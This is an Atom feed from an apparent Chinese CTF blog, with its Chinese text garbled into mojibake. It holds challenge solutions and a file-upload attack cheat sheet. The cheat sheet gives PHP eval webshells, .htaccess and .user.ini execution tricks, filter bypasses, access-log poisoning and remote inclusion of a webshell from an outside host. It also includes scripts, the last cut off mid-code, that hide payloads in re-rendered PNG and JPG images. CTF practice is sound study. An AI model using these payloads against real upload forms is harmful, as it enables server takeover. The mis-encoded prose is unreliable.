<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ä¸­å›½ç†ŠçŒ«çš„åšå®¢</title>
  
  <subtitle>ä¸€åˆ†è€•è€˜ï¼Œä¸€åˆ†æ”¶è·</subtitle>
  <link href="http://haorical.xyz/atom.xml" rel="self"/>
  
  <link href="http://haorical.xyz/"/>
  <updated>2021-11-18T12:37:02.275Z</updated>
  <id>http://haorical.xyz/</id>
  
  <author>
    <name>Haorical</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>20211118</title>
    <link href="http://haorical.xyz/posts/5c3bb6e4/"/>
    <id>http://haorical.xyz/posts/5c3bb6e4/</id>
    <published>2021-11-18T12:06:19.000Z</published>
    <updated>2021-11-18T12:37:02.275Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>ä¸Šä¼ .htaccess </p><p>ä¸Šä¼ shell.jpeg</p><p>ç›´æ¥æ‰«ç›®å½•å³å¯ï¼Œæ²¡æœ‰è¿‡æ»¤ï¼Œéå¸¸å‹å–„</p><pre><code>var_dump(file_get_contents(&#39;/flag&#39;));</code></pre><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>ä¸Šä¼ .user.iniä¸è¿‡æ˜¯è¿™æ ·é…ç½®æ‰èƒ½è¿‡</p><pre><code>auto_prepend_file=shell.jpeg</code></pre><p>ä»¥å‰éƒ½æ˜¯</p><pre><code>auto_append_file=1.txt</code></pre><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>xxe</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢&quot;&gt;&lt;a href=&quot;#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢&quot; class=&quot;headerlink&quot; title=&quot;[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢&quot;&gt;&lt;/a&gt;[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢&lt;/h2&gt;&lt;p&gt;ä¸Šä¼ .htaccess </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>20211117</title>
    <link href="http://haorical.xyz/posts/cc84ab75/"/>
    <id>http://haorical.xyz/posts/cc84ab75/</id>
    <published>2021-11-17T13:53:13.000Z</published>
    <updated>2021-11-17T15:02:12.474Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>å…ˆä¸Šä¼ å‡ ä¸ªæ­£å¸¸å›¾ç‰‡æµ‹è¯•ï¼Œjpegèƒ½ç”¨</p><p>ä¸Šä¼ shellè¿‡æ»¤äº†&lt;?</p><pre><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;</code></pre><p>ç»•è¿‡ï¼Œä¸Šä¼ .htaccess</p><pre><code>AddType application/x-httpd-php .jpeg</code></pre><p>æŠŠsystemè¿‡æ»¤äº†</p><p>å¯ä»¥ç”¨var_dumpæ‰“å°</p><pre><code>var_dump(scandir(&quot;/&quot;))var_dump(file_get_contents(&quot;/flag&quot;));</code></pre><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>å…ˆgithackæŠŠgitæ‰’ä¸‹æ¥ï¼Œæœ‰ä¸ªindex.php</p><p>ä»£ç å®¡è®¡ï¼Œè¿‡æ»¤çš„æ¯”è¾ƒå¤š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">#æŠŠä¼ªåè®®è¯»å–flag.phpç»™banäº†</span></span><br><span class="line">       <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">#å¥—å¨ƒè¿‡æ»¤ï¼ˆæ— å‚æ•°è¿‡æ»¤ï¼‰ éœ€è¦æ„é€ ä¸€ä¸ªç±»ä¼¼è¿™ç©æ„çš„ä¸œè¥¿a(b(c(d(e(f())))));</span></span><br><span class="line">           <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">#è¿‡æ»¤å‡½æ•°å…³é”®å­—</span></span><br></pre></td></tr></table></figure><p>ç„¶åå¼€å§‹æ„é€ </p><pre><code>show_source(next(array_reverse(scandir(current(localeconv())))));</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;GXYCTF2019-BabyUpload&quot;&gt;&lt;a href=&quot;#GXYCTF2019-BabyUpload&quot; class=&quot;headerlink&quot; title=&quot;[GXYCTF2019]BabyUpload&quot;&gt;&lt;/a&gt;[GXYCTF2019]BabyUpload</summary>
      
    
    
    
    <category term="ctfæ¯æ—¥ä¸€é¢˜" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>jwtæ€»ç»“</title>
    <link href="http://haorical.xyz/posts/e8e4811b/"/>
    <id>http://haorical.xyz/posts/e8e4811b/</id>
    <published>2021-11-17T12:54:53.000Z</published>
    <updated>2021-11-17T12:55:25.313Z</updated>
    
    
    
    
    <category term="ctfæ¯æ—¥ä¸€é¢˜" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ä¿¡æ¯æœé›†</title>
    <link href="http://haorical.xyz/posts/b21d488/"/>
    <id>http://haorical.xyz/posts/b21d488/</id>
    <published>2021-11-17T11:35:13.000Z</published>
    <updated>2021-11-17T12:52:11.374Z</updated>
    
    <content type="html"><![CDATA[<h2 id="phps"><a href="#phps" class="headerlink" title="phps"></a>phps</h2><h2 id="git"><a href="#git" class="headerlink" title=".git/"></a>.git/</h2><h2 id="svn"><a href="#svn" class="headerlink" title=".svn/"></a>.svn/</h2><h2 id="swp"><a href="#swp" class="headerlink" title=".swp"></a>.swp</h2><p>ls -al</p><h2 id="http-dbcha-com"><a href="#http-dbcha-com" class="headerlink" title="http://dbcha.com/"></a><a href="http://dbcha.com/">http://dbcha.com/</a></h2><h2 id="adminå¯†ç "><a href="#adminå¯†ç " class="headerlink" title="/adminå¯†ç "></a>/adminå¯†ç </h2><h2 id="editor"><a href="#editor" class="headerlink" title="editor"></a>editor</h2><h2 id="tz-phpæ¢é’ˆ"><a href="#tz-phpæ¢é’ˆ" class="headerlink" title="tz.phpæ¢é’ˆ"></a>tz.phpæ¢é’ˆ</h2><h2 id="cdn-ç»•è¿‡"><a href="#cdn-ç»•è¿‡" class="headerlink" title="cdn ç»•è¿‡"></a>cdn ç»•è¿‡</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;phps&quot;&gt;&lt;a href=&quot;#phps&quot; class=&quot;headerlink&quot; title=&quot;phps&quot;&gt;&lt;/a&gt;phps&lt;/h2&gt;&lt;h2 id=&quot;git&quot;&gt;&lt;a href=&quot;#git&quot; class=&quot;headerlink&quot; title=&quot;.git/&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="ctfå­¦ä¹ " scheme="http://haorical.xyz/categories/ctf%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ååºåˆ—åŒ–æ€»ç»“</title>
    <link href="http://haorical.xyz/posts/1e128b6c/"/>
    <id>http://haorical.xyz/posts/1e128b6c/</id>
    <published>2021-11-15T13:18:08.000Z</published>
    <updated>2021-11-17T12:52:11.376Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ æ€»ç»“</title>
    <link href="http://haorical.xyz/posts/ea42f6a6/"/>
    <id>http://haorical.xyz/posts/ea42f6a6/</id>
    <published>2021-11-10T15:14:50.000Z</published>
    <updated>2021-11-15T09:46:43.179Z</updated>
    
    <content type="html"><![CDATA[<h2 id="åŸºæœ¬æ€è·¯"><a href="#åŸºæœ¬æ€è·¯" class="headerlink" title="åŸºæœ¬æ€è·¯"></a>åŸºæœ¬æ€è·¯</h2><ol><li>ç»•è¿‡å„ç§å‰ç«¯è¿‡æ»¤</li><li>ä¸Šä¼ .user.ini/.htaccess</li><li>ä¸Šä¼ åŒ…å«ä¸€å¥è¯æ–‡ä»¶/æ—¥å¿—åŒ…å«/è¿œç¨‹æ–‡ä»¶åŒ…å«</li><li>ç»•è¿‡å…³é”®å­—è¿‡æ»¤</li><li>ç»•è¿‡ç‰¹æ®Šç±»å‹å¦‚äºŒæ¬¡æ¸²æŸ“/httpd</li><li>sessionç«äº‰</li></ol><h2 id="å‰ç«¯è¿‡æ»¤"><a href="#å‰ç«¯è¿‡æ»¤" class="headerlink" title="å‰ç«¯è¿‡æ»¤"></a>å‰ç«¯è¿‡æ»¤</h2><p>ç›´æ¥æ”¹å‰ç«¯ä»£ç å³å¯</p><h2 id="ç®€å•åç«¯è¿‡æ»¤"><a href="#ç®€å•åç«¯è¿‡æ»¤" class="headerlink" title="ç®€å•åç«¯è¿‡æ»¤"></a>ç®€å•åç«¯è¿‡æ»¤</h2><p>content-type æ”¹ä¸º image/png(jpg/gif)</p><p>filename æ”¹åç¼€</p><p>æ”¹æ–‡ä»¶å¤´ä¸ºgifå¤´</p><pre><code>GIF89a</code></pre><p>æ”¹æ–‡ä»¶å¤´ä¸ºpngå¤´ï¼Œç›´æ¥åœ¨hexæ”¹</p><pre><code>89504e470d0a</code></pre><p>00æˆªæ–­</p><p>test.php1png</p><p>hexä¸­å°†31æ”¹ä¸º00</p><p>php3 php4æµ‹è¯•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="user-iniä¸Šä¼ "><a href="#user-iniä¸Šä¼ " class="headerlink" title=".user.iniä¸Šä¼ "></a>.user.iniä¸Šä¼ </h2><p>upload/ä¸‹å­˜åœ¨index.php</p><p>å…ˆä¸Šä¼ .user.iniï¼Œå†ä¸Šä¼ 1.txtæˆ–å…¶ä»–æ”¯æŒä¸Šä¼ ç±»å‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .user.ini</span></span><br><span class="line">auto_append_file=<span class="number">1.</span>txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.txt</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="phpçŸ­æ ‡ç­¾"><a href="#phpçŸ­æ ‡ç­¾" class="headerlink" title="phpçŸ­æ ‡ç­¾"></a>phpçŸ­æ ‡ç­¾</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;% @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); %&gt;</span><br></pre></td></tr></table></figure><h2 id="å…³é”®å­—è¿‡æ»¤"><a href="#å…³é”®å­—è¿‡æ»¤" class="headerlink" title="å…³é”®å­—è¿‡æ»¤"></a>å…³é”®å­—è¿‡æ»¤</h2><p>[]æ›¿æ¢ä¸º{}</p><p>[] {}å…¨è¿‡æ»¤</p><pre><code>&lt;?=@eval(array_pop($_POST));?&gt;</code></pre><p>; å¯ç›´æ¥å»æ‰;</p><p>ç©ºæ ¼è¿‡æ»¤å°†ç©ºæ ¼æ”¹hexä¸º0d</p><p>. è¿‡æ»¤ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«</p><h2 id="æ—¥å¿—åŒ…å«"><a href="#æ—¥å¿—åŒ…å«" class="headerlink" title="æ—¥å¿—åŒ…å«"></a>æ—¥å¿—åŒ…å«</h2><p>è¿‡æ»¤()<br>.user.ini è‡ªåŠ¨åŒ…å«æ–‡ä»¶å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.txt</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># è¿‡æ»¤ log ç”¨ . åˆ†å¼€å³å¯</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/var/l&#x27;</span>.<span class="string">&#x27;og/nginx/access.l&#x27;</span>.<span class="string">&#x27;og&#x27;</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">è‹¥æœ‰è¿‡æ»¤ï¼Œå¯è¿™æ ·å†™</span><br><span class="line"><span class="meta">&lt;?=</span>include1<span class="string">&#x27;/var/l&#x27;</span>.<span class="string">&#x27;og/nginx/access.l&#x27;</span>.<span class="string">&#x27;og&#x27;</span><span class="meta">?&gt;</span></span><br><span class="line">ä¹‹åæ”¹hexå°†<span class="number">1</span>æ”¹ä¸ºod</span><br></pre></td></tr></table></figure><p>åŸŸåä¸‹éšæœºå†™å…¥1.txtï¼Œæ”¹User-Agentä¸º</p><pre><code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code></pre><p>è®¿é—®upload/æµ‹è¯•</p><h2 id="getimagesizeç»•è¿‡"><a href="#getimagesizeç»•è¿‡" class="headerlink" title="getimagesizeç»•è¿‡"></a>getimagesizeç»•è¿‡</h2><p>æ”¹å¤´ä¸ºgifå¤´</p><p>GIF89a</p><h2 id="include-url-è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#include-url-è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="include url è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>include url è¿œç¨‹æ–‡ä»¶åŒ…å«</h2><p>ç”¨æˆ‘è‡ªå·±çš„urlï¼Œè¿”å›ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬</p><p><a href="http://47.100.75.233/">http://795102185</a></p><pre><code>&lt;?=include&#39;http://795102185&#39;&gt;</code></pre><p>åŸºæœ¬å¯ä»¥é€šæ€</p><h2 id="äºŒæ¬¡æ¸²æŸ“"><a href="#äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="äºŒæ¬¡æ¸²æŸ“"></a>äºŒæ¬¡æ¸²æŸ“</h2><h3 id="gifæ ¼å¼"><a href="#gifæ ¼å¼" class="headerlink" title="gifæ ¼å¼"></a>gifæ ¼å¼</h3><p>æ¯”è¾ƒç®€å•ï¼Œç›´æ¥å¯¹æ¯”æ²¡æœ‰æ”¹å˜çš„åœ°æ–¹ï¼Œåœ¨é‡Œé¢ç›´æ¥æ’å…¥å³å¯</p><h3 id="pngæ ¼å¼"><a href="#pngæ ¼å¼" class="headerlink" title="pngæ ¼å¼"></a>pngæ ¼å¼</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># ?0=call_user_func post 1=ls</span></span><br><span class="line"><span class="comment"># ?0=system 1=whoami</span></span><br><span class="line"></span><br><span class="line">åˆ©ç”¨æŠ“åŒ…çœ‹ä¿¡æ¯ï¼Œå¯èƒ½ä¸å›æ˜¾</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="jpgæ ¼å¼"><a href="#jpgæ ¼å¼" class="headerlink" title="jpgæ ¼å¼"></a>jpgæ ¼å¼</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1=phpinfo();</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    